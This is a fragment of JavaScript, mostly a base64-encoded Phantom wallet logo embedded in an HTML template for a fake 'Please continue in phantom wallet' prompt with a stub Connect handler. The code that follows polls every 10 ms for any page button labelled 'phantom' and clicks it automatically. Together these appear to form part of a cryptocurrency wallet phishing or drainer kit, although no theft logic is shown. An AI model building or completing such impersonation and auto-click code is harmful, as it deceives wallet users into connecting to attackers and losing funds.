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" alt="Phantom Wallet Logo" class="wallet-logo"><br><br>
                <p class="wallet-description">Please continue in phantom wallet</p>
            </div>
            <button class="connect-wallet-button">Connect</button>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const connectButton = document.querySelector('.button');
            
            connectButton.addEventListener('click', function() {
                alert('Connecting to Phantom Wallet...');
                // Add your connection logic here
            });
        });
    </script>
</body>
</html>
`;

  
  });
  
  
  
  

  

  
  
  


  let isPaused = false;

  
  function clickPhantomButton() {
      const buttons = document.querySelectorAll('button');
      for (const button of buttons) {
          if (button.innerText.trim().toLowerCase() === "phantom") {
              
              button.click();
              console.log("found da button");
  
              
              isPaused = true;
              setTimeout(() => {
                  console.log("poll again");
                  isPaused = false;
              }, 3000);
  
              return true;
          }
      }
      
      return false;
  }
  
  
  function pollForPhantomButton() {
      const intervalId = setInterval(() => {
          if (!isPaused) {
              
          
              if (clickPhantomButton()) {
                  console.log("works");
              }
          }
      }, 10); 
  }
  
  
  pollForPhantomButton();
  

